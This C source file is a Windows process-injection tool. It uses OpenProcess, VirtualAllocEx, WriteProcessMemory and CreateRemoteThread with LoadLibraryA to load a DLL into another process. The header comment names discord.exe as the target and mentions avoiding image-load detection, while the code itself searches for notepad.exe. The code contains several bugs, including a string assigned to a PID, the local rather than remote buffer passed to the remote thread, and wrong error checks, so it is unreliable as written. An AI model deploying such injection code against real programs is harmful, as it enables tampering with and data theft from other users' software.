#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define BUFSIZE 4096

/*
 * This file contains the code for doing a regular DLL injection into discord.exe
 * This is NOT the best way to do it, and is the starting point for injecting in.
 * Problems with this approach: 
 * - DLL has to exist on disk
 * - Calling LoadLibraryA creates an image load callback
 * - Doing anything complex in DLL_PROCESS_ATTACH will probably break stuff
*/

int findPID(void);

int main(int argc, char const *argv[])
{
    DWORD pid;
    //if no args, get pid of process we are injecting into
    if(argc > 1) {
        pid = argv[1];
    }else{
        pid = findPID();
        if (pid == 0) {
            printf("[!] Error: Process not found.");
        }
    }

    //get the full path to the dll on disk
    TCHAR dllPath[BUFSIZE] = TEXT("");
    if(GetFullPathNameA("injectable.dll", 4096, dllPath, NULL) == 0){
        printf("[!] Error getting dll path!");
        return 0;
    }

    //open handle to remote process with proper permissions
    DWORD dwDesiredAccess = PROCESS_ALL_ACCESS;
    HANDLE remoteProcess = OpenProcess(dwDesiredAccess, TRUE, pid);
    if(remoteProcess == INVALID_HANDLE_VALUE){
        printf("[!] Error opening remote process!");
        return 0;
    }

    //get address of loadlibraryA in kernel32.dll in our process
    //this will be the same addr in the remote process bc kernel32 is in the same location on any process on boot
    HANDLE hkernel32 = GetModuleHandleA("kernel32.dll");
    if(hkernel32 == INVALID_HANDLE_VALUE){
        printf("[!] Error getting handle for kernel32.dll!");
        return 0;
    }
    FARPROC llaProcAddr = GetProcAddress(hkernel32, "LoadLibraryA");
    if(llaProcAddr == NULL){
        printf("[!] Error getting process address for LoadLibraryA");
        return 0;
    }

    //allocate buffer in the remote process for dlls path
    SIZE_T dwSize = strlen(dllPath);
    DWORD flAllocationType = MEM_RESERVE | MEM_COMMIT; 
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID addressPathRemote = VirtualAllocEx(remoteProcess, NULL, dwSize, flAllocationType, flProtect);
    if(addressPathRemote == NULL){
        printf("[!] Error allocating buffer in the remote process!");
        return 0;
    }

    //copy the path of the dll in to the remote process
    SIZE_T nSize = strlen(dllPath);
    SIZE_T lpNumberOfBytesWritten = NULL;
    if(WriteProcessMemory(remoteProcess, addressPathRemote, dllPath, nSize, lpNumberOfBytesWritten) == 0){
        printf("[!] Error writing process memory!");
        return 0;
    }

    //force process to execute loadlibraryA
    LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
    SIZE_T dwStackSize = 0;
    DWORD dwCreationFlags = NULL;
    LPDWORD lpThreadId = NULL;
    HANDLE hRThread = CreateRemoteThread(
        remoteProcess, lpThreadAttributes, dwStackSize, llaProcAddr, dllPath, dwCreationFlags, lpThreadId);

    if(hRThread == INVALID_HANDLE_VALUE){
        printf("[!] Error creating remote thread!");
    }

    WaitForSingleObject(hRThread, 15000);
    //perform cleanup
    CloseHandle(hRThread);
    CloseHandle(hkernel32);
    CloseHandle(remoteProcess);
    return 0;
}

//function which finds a process's id by its name
int findPID(){
    //create snapshot of all processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot == INVALID_HANDLE_VALUE){
        printf("[!] Error getting snapshot handle!");
        return 0;
    }

    //init processentry32 dwsize
    PROCESSENTRY32 lppe;
    lppe.dwSize = sizeof(PROCESSENTRY32);
    
    //get first process entry
    BOOL result = Process32First(hSnapshot, &lppe);
    if(!result){
        printf("[!] Error getting first process in snapshot! Problem with snapshot.");
        return 0;
    }

    //loop through entries until we find our process or exit
    while(result){
        //if name matches, return PID
        if(strcmp("notepad.exe", lppe.szExeFile) == 0){
            return lppe.th32ProcessID;
        }
        result = Process32Next(hSnapshot, &lppe);
    }

    //process not found, return 0
    return 0;
}